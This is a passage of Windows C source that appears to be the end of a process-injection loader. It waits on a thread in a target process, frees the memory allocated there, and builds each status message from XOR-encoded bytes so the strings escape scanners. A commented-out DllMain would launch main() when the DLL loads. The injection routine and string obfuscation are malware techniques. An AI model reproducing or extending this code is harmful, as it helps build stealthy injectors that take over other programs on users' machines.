		MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 71; _fuckingstring[1] = 96; _fuckingstring[2] = 104; _fuckingstring[3] = 109; _fuckingstring[4] = 100; _fuckingstring[5] = 101; _fuckingstring[6] = 33; _fuckingstring[7] = 117; _fuckingstring[8] = 110; _fuckingstring[9] = 33; _fuckingstring[10] = 98; _fuckingstring[11] = 115; _fuckingstring[12] = 100; _fuckingstring[13] = 96; _fuckingstring[14] = 117; _fuckingstring[15] = 100; _fuckingstring[16] = 33; _fuckingstring[17] = 117; _fuckingstring[18] = 105; _fuckingstring[19] = 115; _fuckingstring[20] = 100; _fuckingstring[21] = 96; _fuckingstring[22] = 101; _fuckingstring[23] = 33; _fuckingstring[24] = 49; _fuckingstring[25] = 121; _fuckingstring[26] = 36; _fuckingstring[27] = 121; _fuckingstring[28] = 11; _fuckingstring[29] = 1; FBXorCrypt(_fuckingstring, 30);
		printf(_fuckingstring, (unsigned int)GetLastError());

		CloseHandle(hw);

		CloseHandle(thread);

	}

	// wait

	WaitForSingleObject(thread, INFINITE);



	VirtualFreeEx(hw, _real_base_in_target_process, _memeoy_size_to_be_allocated_in_target_process, MEM_DECOMMIT);

	MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 103; _fuckingstring[1] = 115; _fuckingstring[2] = 100; _fuckingstring[3] = 100; _fuckingstring[4] = 59; _fuckingstring[5] = 33; _fuckingstring[6] = 49; _fuckingstring[7] = 121; _fuckingstring[8] = 36; _fuckingstring[9] = 121; _fuckingstring[10] = 11; _fuckingstring[11] = 1; FBXorCrypt(_fuckingstring, 12);
	printf(_fuckingstring, (unsigned int)GetLastError());

	VirtualFreeEx(hw, _2_29bytes, 29, MEM_DECOMMIT);

	MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 103; _fuckingstring[1] = 115; _fuckingstring[2] = 100; _fuckingstring[3] = 100; _fuckingstring[4] = 59; _fuckingstring[5] = 33; _fuckingstring[6] = 49; _fuckingstring[7] = 121; _fuckingstring[8] = 36; _fuckingstring[9] = 121; _fuckingstring[10] = 11; _fuckingstring[11] = 1; FBXorCrypt(_fuckingstring, 12);
	printf(_fuckingstring, (unsigned int)GetLastError());

	//printf(

	return 1;

}

//

//

//BOOL APIENTRY DllMain(HMODULE hModule,

//	DWORD  ul_reason_for_call,

//	LPVOID lpReserved

//)

//{

//

//	switch (ul_reason_for_call)

//	{

//	case DLL_PROCESS_ATTACH:

//		//MessageBoxA(NULL, "OK", "OK", MB_OK);

//		main();

//		break;

//	case DLL_THREAD_ATTACH:

//	case DLL_THREAD_DETACH:

//	case DLL_PROCESS_DETACH:

//		break;

//	}

//	return TRUE;

//}
